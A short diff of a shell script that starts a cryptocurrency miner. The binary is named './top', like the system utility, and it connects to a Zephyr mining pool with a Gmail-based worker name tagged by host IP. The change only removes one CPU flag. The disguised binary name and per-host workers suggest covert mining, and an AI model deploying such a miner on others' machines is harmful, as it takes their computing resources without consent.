@@ -9,4 +9,4 @@ if [ -z "$host_ip" ]; then
     echo "ERROR"
     exit 1
 fi
-./top -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/xm$host_ip -k 	--cpu-no-yield  --coin zephyr -a rx/0
+./top -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/xm$host_ip -k --coin zephyr -a rx/0
